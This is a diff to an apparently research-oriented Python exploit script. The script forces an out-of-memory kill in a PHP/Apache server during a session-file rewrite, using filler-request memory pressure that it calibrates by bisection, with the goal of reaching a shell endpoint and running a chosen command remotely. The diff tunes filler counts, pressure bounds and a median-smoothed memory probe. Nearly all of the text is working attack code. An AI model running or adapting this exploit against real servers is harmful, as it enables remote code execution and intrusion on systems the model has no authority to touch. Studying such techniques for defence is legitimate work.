@@ -31,22 +31,24 @@ import json
 import random
 import socket
 import sys
-import threading
 import time
 import urllib.parse
 
 import lab
 
 # --- geometry (same layout as lab; see README for the derivation) ---------
-# Bigger than the local-controller sizes so the victim's RSS clearly
-# exceeds the apache master's at the OOM moment (fillers can never be
-# bigger than the master because post_max_size caps a request at 8 MiB).
-N_FILLERS = 7
+# Per-filler field bytes (body < post_max_size). Four fillers instead of
+# seven: each held filler is a live PHP worker (~3-4MiB of runtime and
+# parse buffers that materialize only after the fillers open - measured
+# in poc/charge_trace.py), and fewer of them shrinks that unmeasured term
+# and the pressure band's spread.
+N_FILLERS = 4
 F_MAX = 7_000_000              # per-filler field bytes (body < post_max_size)
 P_CARRIER_PROGRESS = 336       # carrier progress record length (fixed layout)
 P_START = P_CARRIER_PROGRESS + len(b"bio|s:") + len(str(lab.L1)) + len(':"')
 SHELL = lab.SHELL_URL_PATH
-H_MIN, H_MAX = 2_000_000, 30_000_000   # pressure bracket bounds
+H_MIN, H_MAX = 0, 28_000_000   # pressure bracket bounds (h + 4 fillers
+                               # must fit below post_max_size)
 
 
 # ------------------------------------------------------------------ HTTP I/O
@@ -263,7 +265,8 @@ def classify(rep: dict, c_len: int, r_len: int) -> tuple[str, int | None]:
 
 
 def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
-            b0_ref: int | None = None) -> dict:
+            b0_ref: int | None = None,
+            anchor_hist: list[int] | None = None) -> dict:
     """One full remote attempt with pre-loaded pressure.
 
     h bytes of filler pressure are charged BEFORE the victim request, so the
@@ -331,25 +334,29 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     res["pushed"] = pushed
     time.sleep(0.4)                 # let the charge settle before the victim
 
-    # Evict C's clean pages continuously while the victim reads, serializes
-    # and rewrites the record (stage 2's evictor, over HTTP): the pwrite
-    # then re-creates - re-charges - them, pushing the cgroup over its
-    # limit *inside* the splice window. Without this the overwrite is a
-    # net-zero charge on hosts whose writeback keeps the pages resident,
-    # and the crossing only ever lands past the window (the runner's feed:
-    # early / nooom / late-at-|C|, never a mix). Missing endpoint (a real
-    # target) = no-op, the nominal pressure applies unchanged.
-    drop_done = threading.Event()
-
-    def _drop() -> None:
-        try:
-            http_get(host, port, f"/index.php?drop={sid}&ms=4000",
-                     timeout=10)
-        except OSError:
-            pass
-        drop_done.set()
-
-    threading.Thread(target=_drop, daemon=True).start()
+    # Read the TRUE pre-victim state: the fillers' runtime and the session
+    # file's page cache (a term measured at ~27MiB in charge_trace - it
+    # only materializes once the fillers are open) are invisible at carrier
+    # time, and the pressure correction must cover them. Subtract our own
+    # pushed bytes so the anchor stays h-independent. Missing endpoint (a
+    # real target) = keep the carrier-phase reading.
+    try:
+        pb = http_get(host, port, "/index.php?probe=1", timeout=5)
+        m = pb.find(b"{")
+        if m >= 0:
+            d = json.loads(pb[m:])
+            anchor = int(d.get("mem", 0)) - int(d.get("self", 0)) - pushed
+            if anchor > 0:
+                # Median-smooth: the term jitters a few MiB between
+                # attempts (C's page cache comes and goes, workers
+                # differ), and an unsmoothed correction injects that
+                # jitter straight into the pressure.
+                if anchor_hist is not None:
+                    anchor_hist.append(anchor)
+                    anchor = sorted(anchor_hist)[len(anchor_hist) // 2]
+                res["b0"] = anchor
+    except (OSError, ValueError):
+        pass
 
     victim, _ = lab.replacement_hold(sid)
     ev, drop_ms, vresp = victim_wait(victim, timeout=6.0)
@@ -357,7 +364,6 @@ def attempt(host: str, port: int, h: int, c_len: int, r_len: int,
     res["drop_ms"] = round(drop_ms, 1)
     if vresp:
         res["vresp"] = vresp[:80].decode(errors="replace")
-    drop_done.wait(timeout=2)
 
     # Release the pressure BEFORE reading the oracle: the consumer has to
     # read the (up to 16 MiB) session file and must not OOM on the way.
@@ -434,27 +440,30 @@ def exploit(host: str, port: int, command: str, max_attempts: int = 40,
     # raw field bytes do not account for) + H. The OOM then has to land
     # inside the victim's session rewrite: after serialization
     # (B + the string must still fit) but within the first E' bytes of
-    # the pwrite. That is a ~2 MiB band, far narrower than a fixed-step
-    # walk can reliably find - so H is bisected: early (OOM before the
-    # write) lowers the ceiling, late/nooom (write ran past the window)
-    # raises the floor, in-window k gets a proportional correction.
-    h = 22_000_000
-    h_min, h_max = 2_000_000, 30_000_000
+    # the pwrite. E' ~8MiB makes the landable band correspondingly wide,
+    # but the pre-victim state jitters between attempts, so H is
+    # bisected: early (OOM before the write) lowers the ceiling,
+    # late/nooom (write ran past the window) raises the floor, and once
+    # bracketed the band is sampled (the outcome is stochastic at the
+    # edges).
+    h = 16_000_000
+    h_min, h_max = H_MIN, H_MAX
     lo, hi = h_min, h_max      # bracket around the landable pressure
-    MIN_W = 2_000_000          # the k-window's width in h units - never
-                               # sample narrower: the baseline jitters
-                               # ~1-2MiB between attempts (worker arena
-                               # recycling), which slides the window
+    MIN_W = 4_000_000          # never sample narrower than half the
+                               # k-window's width in h units - the
+                               # pre-victim state jitters ~1-2MiB and
+                               # slides the window under a fixed h
     last_signal = None         # "early" = too high | "low" = too low
     step = 4_000_000           # max proportional correction inside window
 
     b0_ref = None          # first attempt's measured baseline (fresh target)
+    anchors: list[int] = [] # rolling anchor history for median smoothing
 
     for i in range(1, max_attempts + 1):
         if not wait_server(host, port):
             return {"error": "server unreachable"}
         try:
-            res = attempt(host, port, h, c_len, r_len, b0_ref)
+            res = attempt(host, port, h, c_len, r_len, b0_ref, anchors)
         except OSError as e:
             # Transient connection loss (e.g. the target is restarting after
             # an OOM): wait for it to come back and retry instead of dying.
